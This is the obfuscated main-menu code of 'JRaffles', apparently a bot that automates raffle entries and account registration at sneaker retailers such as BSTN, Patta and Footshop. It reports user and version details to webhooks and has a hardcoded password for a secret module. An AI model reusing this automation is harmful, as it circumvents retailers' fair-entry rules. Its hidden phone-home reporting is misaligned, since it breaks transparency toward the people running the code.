    for (var _0x319d37 = 0x0; _0x319d37 < _0x501a11['length']; _0x319d37++) {
        var _0x591b27 = _0x501a11[_0x319d37]['Store'], _0x318c7a = _0x501a11[_0x319d37]['Mode'];
        for (var _0x53aafc of _0xa96df6) {
            const _0x3173bb = _0x53aafc['name']['includes'](_0x591b27);
            if (_0x3173bb)
                for (mode of _0xa96df6[_0x53aafc]['modules']) {
                    const _0x4719f5 = mode['name']['includes'](_0x318c7a);
                    _0x4719f5 && (_0x3d7071 = mode['name'], await mode['function'](_0x3d7071, _0x501a11[_0x319d37], _0x1ae999));
                }
        }
    }
}
async function _0xc24ba4() {
    await _0x1d292e(), console['clear']();
    if (_0x233a0d != 'devkey') {
        let _0x2dc4e1 = await _0xfc3f06['autoUpdate']();
        if (_0x2dc4e1 === 'yes')
            return _0x289607('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x1428e0 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0xf09eb2(0x2710);
        ;
    }
    await _0x42a107(_0x1428e0);
    if (_0x2999fb === ![])
        return console['log']('Closing\x20Browser'), await _0xf09eb2(0xbb8);
    else
        try {
            var _0x253706 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x1c4b49
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x233a0d
                    }
                ]
            }];
            const _0x4d528b = { 'embeds': _0x253706 };
            var _0x3fd3d4 = await _0x22cd2f(null, null, 'open', ![]);
            const _0x5a7262 = { 'openDEVMSG': { 'embeds': [_0x3fd3d4] } };
            await _0x58a176(_0x381bd0, _0x5a7262['openDEVMSG']);
            async function _0x1acbae() {
                _0x3e9ae7('JRaffles\x20' + _0x233a0d), console['clear'](), console['log']('Hello\x20' + _0x4f1d86['cyan']('' + _0x1c4b49) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x233a0d), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x11e7f4 = 0x0; _0x11e7f4 < _0xa96df6['length'] - 0x4; _0x11e7f4++) {
                    if (_0x11e7f4 >= 0xa) {
                        console['log']('\x20(' + _0x11e7f4 + ')\x20[' + _0xa96df6[_0x11e7f4]['name'] + ']');
                        continue;
                    }
                    if (_0xa96df6[_0x11e7f4]['name'] === 'Reload\x20Settings' || _0xa96df6[_0x11e7f4]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x11e7f4 + ')\x20\x20[' + _0xa96df6[_0x11e7f4]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0xa96df6['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0xa96df6['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0xa96df6['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0xa96df6['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x22e301();
                if (taskModule > _0xa96df6['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0xf09eb2(0x3e8), _0x1acbae();
                if (_0xa96df6[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x785bd7(_0xa96df6[taskModule]['modules']);
                    var _0x117593 = _0xa96df6[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x397b31 = await _0x48df80();
                            await _0x117593['function'](_0x117593, _0x397b31);
                        }
                        if (taskFunction == 0x2) {
                            var _0x397b31 = await _0x48df80(), _0x21994c = await _0x33d6f7(_0x117593);
                            _0x1940dd['shuffleTasks'] && await _0x58dbe9(_0x21994c), await _0x117593['function'](_0x117593, _0x21994c, _0x397b31);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x397b31 = await _0x48df80(), _0x21994c = await _0x33d6f7(_0x117593);
                                _0x1940dd['shuffleTasks'] && await _0x58dbe9(_0x21994c), await _0x117593['function'](_0x117593, _0x21994c, _0x397b31);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x397b31 = await _0x48df80();
                                    await _0x117593['function'](_0x117593, _0x397b31);
                                }
                            }
                        }
                    } catch (_0xcbae54) {
                        console['log'](_0xcbae54), await _0xf09eb2(0x7d0);
                    }
                    return _0x1acbae();
                }
                if (_0xa96df6[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x785bd7(_0xa96df6[taskModule]['modules']);
                        var _0x117593 = _0xa96df6[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x397b31 = await _0x48df80(), _0x4f3cc0 = await _0x33d6f7(_0x117593);
                            _0x1940dd['shuffleTasks'] && await _0x58dbe9(_0x4f3cc0), await _0x117593['function'](_0x117593, _0x4f3cc0, _0x397b31);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x397b31 = await _0x48df80(), _0x4f3cc0 = await _0x33d6f7(_0x117593);
                                _0x1940dd['shuffleTasks'] && await _0x58dbe9(_0x4f3cc0), await _0x117593['function'](_0x117593, _0x4f3cc0, _0x397b31);
                            }
                        }
                    } catch (_0x5f21ad) {
                        console['log'](_0x5f21ad), await _0xf09eb2(0xfa0);
                    }
                    return _0x1acbae();
                }
                if (_0xa96df6[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x785bd7(_0xa96df6[taskModule]['modules']);
                        var _0x117593 = _0xa96df6[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x397b31 = await _0x48df80(), _0x4f3cc0 = await _0x33d6f7(_0x117593);
                            _0x1940dd['shuffleTasks'] && await _0x58dbe9(_0x4f3cc0), await _0x117593['function'](_0x117593, _0x4f3cc0, _0x397b31);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x397b31 = await _0x48df80(), _0x4f3cc0 = await _0x33d6f7(_0x117593);
                                _0x1940dd['shuffleTasks'] && await _0x58dbe9(_0x4f3cc0), await _0x117593['function'](_0x117593, _0x4f3cc0, _0x397b31);
                            }
                        }
                    } catch (_0x1d80dd) {
                        console['log'](_0x1d80dd), await _0xf09eb2(0xfa0);
                    }
                    return _0x1acbae();
                }
                if (_0xa96df6[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x785bd7(_0xa96df6[taskModule]['modules']);
                    var _0x117593 = _0xa96df6[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x397b31 = await _0x48df80();
                        return await _0x117593['function'](_0x117593, _0x397b31), _0x1acbae();
                    }
                    var _0x397b31 = await _0x48df80(), _0x299041 = await _0x33d6f7(_0x117593);
                    return _0x1940dd['shuffleTasks'] && await _0x58dbe9(_0x299041), await _0x117593['function'](_0x117593, _0x299041, _0x397b31), _0x1acbae();
                }
                if (_0xa96df6[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x785bd7(_0xa96df6[taskModule]['modules']);
                    var _0x117593 = _0xa96df6[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x397b31 = await _0x48df80(), _0x299041 = await _0x33d6f7(_0x117593);
                    return _0x1940dd['shuffleTasks'] && await _0x58dbe9(_0x299041), await _0x117593['function'](_0x117593, _0x299041, _0x397b31), _0x1acbae();
                }
                if (_0xa96df6[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x785bd7(_0xa96df6[taskModule]['modules']);
                    var _0x117593 = _0xa96df6[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x397b31 = await _0x48df80(), _0x299041 = await _0x33d6f7(_0x117593);
                    return _0x1940dd['shuffleTasks'] && await _0x58dbe9(_0x299041), await _0x117593['function'](_0x117593, _0x299041, _0x397b31), _0x1acbae();
                }
                if (_0xa96df6[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x785bd7(_0xa96df6[taskModule]['modules']);
                    var _0x117593 = _0xa96df6[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x397b31 = await _0x48df80(), _0x299041 = await _0x33d6f7(_0x117593);
                    return _0x1940dd['shuffleTasks'] && await _0x58dbe9(_0x299041), await _0x117593['function'](_0x117593, _0x299041, _0x397b31), _0x1acbae();
                } else {
                    if (_0xa96df6[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x785bd7(_0xa96df6[taskModule]['modules']);
                        var _0x117593 = _0xa96df6[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x397b31 = await _0x48df80(), _0x555558 = await _0x33d6f7(_0x117593);
                            return _0x1940dd['shuffleTasks'] && await _0x58dbe9(_0x555558), await _0x117593['function'](_0x117593, _0x555558, _0x397b31), _0x1acbae();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x397b31 = await _0x48df80();
                                return await _0x117593['function'](_0x117593, null, _0x397b31), _0x1acbae();
                            }
                        }
                        ;
                    } else {
                        if (_0xa96df6[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x785bd7(_0xa96df6[taskModule]['modules']);
                            var _0x117593 = _0xa96df6[taskModule]['modules'][taskFunction], _0x397b31 = await _0x48df80(), _0x294357 = await _0x33d6f7(_0x117593);
                            return _0x1940dd['shuffleTasks'] && await _0x58dbe9(_0x294357), await _0x117593['function'](_0x117593, _0x294357, _0x397b31), await _0xf09eb2(0x1388), _0x1acbae();
                        } else {
                            if (_0xa96df6[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x785bd7(_0xa96df6[taskModule]['modules']);
                                var _0x117593 = _0xa96df6[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x397b31 = await _0x48df80(), _0x555558 = await _0x33d6f7(_0x117593);
                                    return _0x1940dd['shuffleTasks'] && await _0x58dbe9(_0x555558), await _0x117593['function'](_0x117593, _0x555558, _0x397b31), _0x1acbae();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x397b31 = await _0x48df80();
                                        return await _0x117593['function'](_0x117593, null, _0x397b31), _0x1acbae();
                                    }
                                }
                                ;
                            } else {
                                if (_0xa96df6[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x785bd7(_0xa96df6[taskModule]['modules']);
                                    var _0x117593 = _0xa96df6[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await bwAcc('https://bouncewear.com/nl/account/register', _0x117593);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0xa96df6[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x785bd7(_0xa96df6[taskModule]['modules']);
                                        var _0x117593 = _0xa96df6[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x397b31 = await _0x48df80(), _0x97decc = await _0x33d6f7(_0x117593);
                                            return _0x1940dd['shuffleTasks'] && await _0x58dbe9(_0x97decc), await _0x117593['function'](_0x117593, _0x97decc, _0x397b31), _0x1acbae();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x397b31 = await _0x48df80(), _0x97decc = await _0x33d6f7(_0x117593);
                                                return _0x1940dd['shuffleTasks'] && await _0x58dbe9(_0x97decc), await _0x117593['function'](_0x117593, _0x97decc, _0x397b31), _0x1acbae();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0xa96df6[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x785bd7(_0xa96df6[taskModule]['modules']);
                                            var _0x117593 = _0xa96df6[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x397b31 = await _0x48df80(), _0x30da59 = await _0x33d6f7(_0x117593);
                                                return _0x1940dd['shuffleTasks'] && await _0x58dbe9(_0x30da59), await _0x117593['function'](_0x117593, _0x30da59, _0x397b31), _0x1acbae();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x397b31 = await _0x48df80(), _0x30da59 = await _0x33d6f7(_0x117593);
                                                    return _0x1940dd['shuffleTasks'] && await _0x58dbe9(_0x30da59), await _0x117593['function'](_0x117593, _0x30da59, _0x397b31), _0x1acbae();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0xa96df6[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x785bd7(_0xa96df6[taskModule]['modules']);
                                                var _0x117593 = _0xa96df6[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x397b31 = await _0x48df80(), _0x54f76f = await _0x33d6f7(_0x117593);
                                                    return _0x1940dd['shuffleTasks'] && await _0x58dbe9(_0x54f76f), await _0x117593['function'](_0x117593, _0x54f76f, _0x397b31), _0x1acbae();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x397b31 = await _0x48df80(), _0x54f76f = await _0x33d6f7(_0x117593);
                                                        return _0x1940dd['shuffleTasks'] && await _0x58dbe9(_0x54f76f), await _0x117593['function'](_0x117593, _0x54f76f, _0x397b31), _0x1acbae();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0xa96df6[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x785bd7(_0xa96df6[taskModule]['modules']);
                                                    var _0x117593 = _0xa96df6[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x397b31 = await _0x48df80(), _0x776fb2 = await _0x33d6f7(_0x117593);
                                                        return _0x1940dd['shuffleTasks'] && await _0x58dbe9(_0x776fb2), await _0x117593['function'](_0x117593, _0x776fb2, _0x397b31), _0x1acbae();
                                                    }
                                                } else {
                                                    if (_0xa96df6[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0xf09eb2(0x3e8), _0x1acbae();
                                                    else {
                                                        if (_0xa96df6[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x4195be = _0xa96df6[taskModule]['name'], _0x397b31 = await _0x48df80();
                                                            return await _0xdf877d(_0x4195be, _0x397b31), _0x1acbae();
                                                        } else {
                                                            if (_0xa96df6[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                taskFunction = await _0x785bd7(_0xa96df6[taskModule]['modules']);
                                                                var _0x117593 = _0xa96df6[taskModule]['modules'][taskFunction];
                                                                return await _0x117593['function'](_0x117593), _0x1acbae();
                                                            } else {
                                                                if (_0xa96df6[taskModule]['name'] == 'Change\x20Settings') {
                                                                    console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                    var _0x1ad9d6 = 0x0;
                                                                    for (const _0x4b188b in _0x1940dd) {
                                                                        console['log']('(' + _0x1ad9d6 + ')\x20' + _0x4b188b + '\x20:\x20' + _0x1940dd[_0x4b188b]), _0x1ad9d6++;
                                                                    }
                                                                    console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x1ad9d6 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                    var _0x15a25b = await _0x42b290();
                                                                    if (_0x15a25b == _0x1ad9d6)
                                                                        return _0x1acbae();
                                                                    console['clear'];
                                                                    var _0x2dbabd = 0x0;
                                                                    for (var _0x429321 in _0x1940dd) {
                                                                        if (_0x15a25b == _0x2dbabd) {
                                                                            console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x429321 + '\x20:'), _0x1940dd[_0x429321] = await _0x10810c(), _0x4b4581['writeFileSync']('../settings.json', JSON['stringify'](_0x1940dd));
                                                                            break;
                                                                        } else
                                                                            _0x2dbabd++;
                                                                    }
                                                                    return console['log']('Settings\x20Saved!'), await _0xf09eb2(0xbb8), _0x1acbae();
                                                                } else {
                                                                    if (_0xa96df6[taskModule]['name'] == 'Reload\x20Settings')
                                                                        return console['log']('Reloading\x20settings'), await _0x1d292e(), _0x1acbae();
                                                                    else {
                                                                        if (taskModule == 0x45) {
                                                                            _0xa96df6[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                            var _0x1c1378 = await _0x534071();
                                                                            _0x1c1378 == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x90604f(), await afewFunction(_0x34f3db[_0x20db65], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0xf09eb2(0xbb8));
                                                                        } else {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x1acbae();
            } catch (_0x220b8d) {
                return console['log'](_0x220b8d), _0x1acbae();
            }
        } catch (_0x55f814) {
            return console['log'](_0x55f814), await _0xf09eb2(0x3a98);
        }
}
;
_0x3e9ae7('JRaffles\x20' + _0x233a0d), _0x1d292e();
try {
    _0xc24ba4();
} catch (_0x1a101a) {
    var _0x22e9ec = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x1c4b49
            },
            {
                'name': 'Version',
                'value': '' + _0x233a0d
            },
            {
                'name': 'Error',
                'value': '' + _0x1a101a
            }
        ]
    }];
    const _0x15221c = { 'embeds': _0x22e9ec };
    _0x58a176(_0x45f55a, _0x15221c);
}